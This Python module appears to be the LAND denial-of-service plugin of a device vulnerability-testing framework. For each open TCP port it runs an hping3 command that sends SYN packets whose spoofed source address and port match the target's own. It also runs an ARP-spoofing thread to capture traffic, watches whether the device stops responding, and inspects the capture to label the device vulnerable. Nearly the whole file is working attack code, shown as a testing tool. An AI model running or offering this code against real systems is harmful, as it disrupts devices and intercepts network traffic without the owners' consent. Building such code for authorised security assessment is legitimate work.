from generic_attack import *
import subprocess
import time
import threading
from arp_spoof import ArpSpoof
from scapy.all import *

log = logging.getLogger(__name__)

class LandDoS(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(LandDoS, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        global arpspoof
        arpspoof = ArpSpoof("ArpSpoof", self.config, self.device)
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        if self.config['vulnerability_validation']:
            arp_status = {}
            tarp = threading.Thread(target=arpspoof.initialize, args=(arp_status,))
            tarp.start()
            time.sleep(5)

        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
        tstatus.start()

        packetDataSize = self.config['data_size'] #bytes
        packetCount = self.config['packet_count']
        interval = self.config['interval']
        start_time = time.time()
        for port in self.device["vulnerable_ports"]["tcp"]["open"]:
            command = "hping3 -V -c %d -i %s -d %d -S -p %d -s %d -a %s %s" % (
            packetCount, interval, packetDataSize, port, port, target, target)
            p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            # This makes the wait possible
            p.wait()

        result.update({"directed_traffic(bytes/sec)": (packetCount * (packetDataSize + 40)) / (
            time.time() - start_time), "attack_time:" : (time.time() - start_time)})
        self.running = False
        tstatus.join()

        if self.config['vulnerability_validation']:
            arpspoof.shutdown()
            tarp.join()

        vulnerable = False
        if self.config['vulnerability_validation']:
            file_prefix = self.config["file_prefix"]
            filename = 'results/' + self.device['time'] + '_' + file_prefix + '_cap.pcap'
            pcap = rdpcap(filename)
            sessions = pcap.sessions()
            for session in sessions:
                for packet in sessions[session]:
                    try:
                        if packet['IP'].src == packet['IP'].dst and packet['TCP'].flags == 12:
                            if packet['TCP'].dport in self.device["vulnerable_ports"]["tcp"]["open"] or packet['TCP'].sport in \
                                    self.device["vulnerable_ports"]["tcp"]["open"]:
                                vulnerable = True
                    except:
                        pass

        if vulnerable:
            result.update({"status": "vulnerable"})
        else:
            result.update({"status": "not_vulnerable"})
        return

    def deviceStatus(self, result):
        max = 5
        detected = 0
        while self.running:
            if not self.is_alive():
                detected = detected + 1
                time.sleep(0.1)
                if detected == max:
                    result.update({"dos-status": "device not responding"})
                    return
        result.update({"dos-status": "device responding"})
        return

    def shutdown(self):
        if self.config['vulnerability_validation']:
            global arpspoof
            arpspoof.shutdown()
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
